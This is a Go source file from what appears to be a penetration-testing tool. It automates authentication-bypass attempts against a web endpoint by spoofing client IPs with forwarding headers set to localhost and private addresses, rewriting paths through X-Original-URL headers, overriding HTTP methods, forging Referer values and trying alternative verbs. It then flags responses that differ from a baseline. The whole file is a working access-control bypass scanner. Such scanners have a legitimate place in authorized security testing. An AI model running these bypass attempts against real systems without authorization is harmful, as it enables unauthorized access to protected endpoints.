package lib

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
)

// bypassHeaders 用于 IP 伪造 / 路径重写的请求头
var bypassIPHeaders = []string{
	"X-Forwarded-For",
	"X-Forward-For",
	"X-Forwarded",
	"X-Forwarded-By",
	"X-Forwarded-Host",
	"X-Forwarded-Server",
	"Forwarded-For",
	"Forwarded",
	"X-Originating-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"X-Real-IP",
	"X-True-IP",
	"True-Client-IP",
	"Client-IP",
	"Cluster-Client-IP",
	"X-Client-IP",
	"X-Custom-IP-Authorization",
	"X-ProxyUser-Ip",
	"X-Original-Remote-Addr",
	"CF-Connecting-IP",
	"X-Host",
}

// bypassIPValues 伪造 IP 值
var bypassIPValues = []string{
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"localhost",
	"0.0.0.0",
	"0",
	"10.0.0.1",
	"172.16.0.1",
	"192.168.0.1",
	"192.168.1.1",
}

// bypassPathHeaders 用于路径重写的请求头
var bypassPathHeaders = []string{
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Override-URL",
}

// methodOverrideHeaders 方法覆盖头
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

// alternativeMethods 替代 HTTP 方法
var alternativeMethods = []string{
	"PUT",
	"PATCH",
	"DELETE",
	"TRACE",
	"OPTIONS",
	"HEAD",
	"CONNECT",
	"MOVE",
	"COPY",
}

// HeaderBypassStart 使用 HTTP Header 绕过技术进行测试
func HeaderBypassStart(url, noauth, auth string, thread int, debug int) {
	fmt.Println(Blue("[+] Header Bypass poc 开始测试"))

	if strings.HasSuffix(url, "/") {
		url = strings.TrimSuffix(url, "/")
	}

	// 先获取原始响应作为基准
	resp, err := HttpClient.Get(url + auth)
	if err != nil {
		fmt.Printf(Red("[-] 请求原始鉴权接口失败: %s\n"), err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	origLen := len(body)
	origCode := resp.StatusCode
	fmt.Printf(Green("[+] 原始鉴权接口 %s 的响应: len=%d code=%d\n"), url+auth, origLen, origCode)

	// 构建所有测试用例
	type testCase struct {
		method  string
		url     string
		headers map[string]string
		desc    string
	}

	var cases []testCase

	// 1. IP 伪造 Header 绕过
	for _, header := range bypassIPHeaders {
		for _, ip := range bypassIPValues {
			cases = append(cases, testCase{
				method:  "GET",
				url:     url + auth,
				headers: map[string]string{header: ip},
				desc:    fmt.Sprintf("Header[%s: %s]", header, ip),
			})
		}
	}

	// 2. 路径重写 Header 绕过
	for _, header := range bypassPathHeaders {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + noauth, // 请求无需鉴权接口
			headers: map[string]string{header: auth}, // 但通过 header 指向鉴权接口
			desc:    fmt.Sprintf("PathRewrite[%s: %s]", header, auth),
		})
		// 也尝试请求根路径
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + "/",
			headers: map[string]string{header: auth},
			desc:    fmt.Sprintf("PathRewrite[%s: %s] via /", header, auth),
		})
	}

	// 3. 方法覆盖 Header
	for _, header := range methodOverrideHeaders {
		for _, method := range []string{"GET", "POST", "PUT", "PATCH", "DELETE"} {
			cases = append(cases, testCase{
				method:  "GET",
				url:     url + auth,
				headers: map[string]string{header: method},
				desc:    fmt.Sprintf("MethodOverride[%s: %s]", header, method),
			})
		}
	}

	// 4. Referer 伪造
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"Referer": url + auth},
		desc:    "Referer[self]",
	})
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"Referer": url + "/"},
		desc:    "Referer[root]",
	})

	// 5. 替代 HTTP 方法
	for _, method := range alternativeMethods {
		cases = append(cases, testCase{
			method:  method,
			url:     url + auth,
			headers: nil,
			desc:    fmt.Sprintf("Method[%s]", method),
		})
	}

	// 6. Content-Length: 0 + POST
	cases = append(cases, testCase{
		method:  "POST",
		url:     url + auth,
		headers: map[string]string{"Content-Length": "0"},
		desc:    "POST+Content-Length:0",
	})

	total := len(cases)
	fmt.Printf(Blue("[+] 共生成 %d 个 Header/Method 测试用例\n"), total)

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, thread)
	mu := &sync.Mutex{}
	var exportData [][]string
	seen := make(map[string]bool)
	var completed int64

	for _, tc := range cases {
		wg.Add(1)
		go func(tc testCase) {
			defer wg.Done()

			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			req, err := http.NewRequest(tc.method, tc.url, bytes.NewBuffer([]byte{}))
			if err != nil {
				return
			}

			for k, v := range tc.headers {
				req.Header.Set(k, v)
			}

			resp, err := HttpClient.Do(req)
			current := atomic.AddInt64(&completed, 1)
			if err != nil {
				if debug == 1 {
					mu.Lock()
					fmt.Printf(Yellow("[!] %s 请求失败 [%d/%d]: %s\n"), tc.desc, current, total, err)
					mu.Unlock()
				}
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}

			newLen := len(body)
			newCode := resp.StatusCode

			mu.Lock()
			defer mu.Unlock()

			if current%100 == 0 || int(current) == total {
				fmt.Printf(Blue("[*] Header/Method 进度: [%d/%d]\n"), current, total)
			}

			if debug == 1 {
				fmt.Printf(Green("[+] %s: len=%d code=%d\n"), tc.desc, newLen, newCode)
				key := fmt.Sprintf("%s|%d|%d", tc.desc, newLen, newCode)
				if !seen[key] {
					seen[key] = true
					exportData = append(exportData, []string{
						tc.desc,
						tc.url,
						fmt.Sprintf("%d", newLen),
						fmt.Sprintf("%d", newCode),
						classifyResult(origLen, newLen, origCode, newCode),
					})
				}
			} else if (newLen != origLen || newCode != origCode) && newCode != 404 {
				fmt.Printf(Green("[+] %s: len=%d code=%d\n"), tc.desc, newLen, newCode)
				key := fmt.Sprintf("%s|%d|%d", tc.desc, newLen, newCode)
				if !seen[key] {
					seen[key] = true
					exportData = append(exportData, []string{
						tc.desc,
						tc.url,
						fmt.Sprintf("%d", newLen),
						fmt.Sprintf("%d", newCode),
						classifyResult(origLen, newLen, origCode, newCode),
					})
				}
			}
		}(tc)
	}

	wg.Wait()

	headers := []string{"绕过技术", "URL", "响应长度", "状态码", "判定"}
	ExportToExcel(url, "header_bypass_results.xlsx", headers, exportData)
}
